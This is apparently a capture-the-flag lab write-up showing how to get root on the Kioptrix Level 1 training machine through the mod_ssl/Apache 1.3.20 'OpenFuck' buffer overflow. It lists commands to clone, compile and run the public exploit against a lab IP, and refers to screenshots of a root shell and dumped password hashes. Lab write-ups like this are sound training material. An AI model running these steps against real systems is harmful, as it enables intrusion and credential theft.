# Kioptrix L1: Privilege Escalation exploiting Secure Socket Layer + Apache Server

## Summary:
The versions of SSL+Apache available in Kioptrix L1 allows an attacker to run a buffer overflow attack and gain root privileges.

## Technical Details:
The version available of mod_ssl in Kioptrix L1 is 2.8.4 and Apache's version is 1.3.20, taking in count Kioptrix is implemented using Red Hat Linux, there is a known
vulnerability to run a buffer overflow in order to gain root access, technical disclosure about the vulnerability named as OpenFuckV2 is available **[here](https://www.exploit-db.com/exploits/764)** 
and **[here](https://github.com/heltonWernik/OpenLuck)**.

## Steps to exploit the vulnerability:
1) git clone https://github.com/heltonWernik/OpenFuck.git
2) apt-get install libssl-dev
3) cd OpenFuck/
4) gcc -o exploit OpenFuck.c -lcrypto
5) ./exploit
6) ./exploit 0x6b 192.168.80.145 443 -c 40 (run the exploit against a machine implemented just like Kioptrix L1)

## Supporting Material:
1) Running exploit and handshaking:

![openfuck_01.png](./media/openfuck_01.png?raw=true "running exploit and handshaking")

2) whoami, hostname, pwd:

![openfuck_02.png](./media/openfuck_02.png?raw=true "whoami, hostname and pwd commands")

3) Listing password hashes:

![openfuck_03.png](./media/openfuck_03.png?raw=true "password hashes")

## Impact:
The exploitation of this issue compromise 100% the integrity of the Kioptrix L1 Server: sourcecode, user's credentials, directories, files and logs